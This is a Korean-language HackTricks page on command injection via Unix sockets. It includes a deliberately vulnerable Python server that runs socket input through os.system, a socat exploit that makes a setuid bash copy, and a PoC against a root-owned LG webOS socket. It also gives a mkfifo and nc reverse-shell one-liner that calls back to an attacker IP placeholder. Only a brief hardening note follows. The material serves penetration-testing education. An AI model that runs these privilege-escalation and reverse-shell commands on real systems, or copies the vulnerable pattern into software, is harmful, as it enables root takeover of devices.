# Socket Command Injection

{{#include ../../banners/hacktricks-training.md}}

## Python으로 된 Socket 바인딩 예제

다음 예제에서는 **unix socket이 생성**됩니다 (`/tmp/socket_test.s`) 그리고 **수신된** 모든 내용은 `os.system`에 의해 **실행**됩니다. 실제로 이런 코드를 현장에서 만나긴 어렵겠지만, 이 예제의 목적은 unix sockets를 사용하는 코드가 어떻게 생겼는지와 최악의 경우 입력을 어떻게 처리해야 하는지를 보여주는 것입니다.
```python:s.py
import socket
import os, os.path
import time
from collections import deque

if os.path.exists("/tmp/socket_test.s"):
os.remove("/tmp/socket_test.s")

server = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
server.bind("/tmp/socket_test.s")
os.system("chmod o+w /tmp/socket_test.s")
while True:
server.listen(1)
conn, addr = server.accept()
datagram = conn.recv(1024)
if datagram:
print(datagram)
os.system(datagram)
conn.close()
```
**실행** 코드를 python으로 실행하세요: `python s.py` 그리고 **소켓이 어떻게 리스닝되는지 확인하세요**:
```python
netstat -a -p --unix | grep "socket_test"
(Not all processes could be identified, non-owned process info
will not be shown, you would have to be root to see it all.)
unix  2      [ ACC ]     STREAM     LISTENING     901181   132748/python        /tmp/socket_test.s
```
**Exploit**
```python
echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | socat - UNIX-CLIENT:/tmp/socket_test.s
```
## 사례 연구: Root-owned UNIX socket signal-triggered escalation (LG webOS)

일부 privileged daemon들은 untrusted input을 받는 root-owned UNIX socket을 노출하고, privileged actions을 thread-IDs와 signals에 결합합니다. 프로토콜이 unprivileged client가 어떤 native thread가 타겟이 될지 영향을 줄 수 있게 허용한다면, privileged code path를 트리거해 escalate할 수 있습니다.

관찰된 패턴:
- root-owned socket에 연결 (예: /tmp/remotelogger).
- 스레드를 생성하고 해당 native thread id (TID)를 얻는다.
- 요청으로 TID (packed)와 padding을 함께 전송; acknowledgement를 받는다.
- 해당 TID에 특정 signal을 전달하여 privileged behaviour를 트리거한다.

간단한 PoC 스케치:
```python
import socket, struct, os, threading, time
# Spawn a thread so we have a TID we can signal
th = threading.Thread(target=time.sleep, args=(600,)); th.start()
tid = th.native_id  # Python >=3.8
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect("/tmp/remotelogger")
s.sendall(struct.pack('<L', tid) + b'A'*0x80)
s.recv(4)  # sync
os.kill(tid, 4)  # deliver SIGILL (example from the case)
```
이를 root shell로 만들려면, 간단한 named-pipe + nc 패턴을 사용할 수 있습니다:
```bash
rm -f /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER-IP> 23231 > /tmp/f
```
노트:
- 이 유형의 버그는 권한 없는 클라이언트 상태(TIDs)에서 유래한 값을 신뢰하고 이를 권한 있는 시그널 핸들러나 로직에 바인딩함으로써 발생합니다.
- 소켓에 대한 자격 증명을 강제하고, 메시지 형식을 검증하며, 외부에서 제공된 스레드 식별자와 권한 있는 작업을 분리하여 시스템을 강화하세요.

## References

- [LG WebOS TV Path Traversal, Authentication Bypass and Full Device Takeover (SSD Disclosure)](https://ssd-disclosure.com/lg-webos-tv-path-traversal-authentication-bypass-and-full-device-takeover/)

{{#include ../../banners/hacktricks-training.md}}
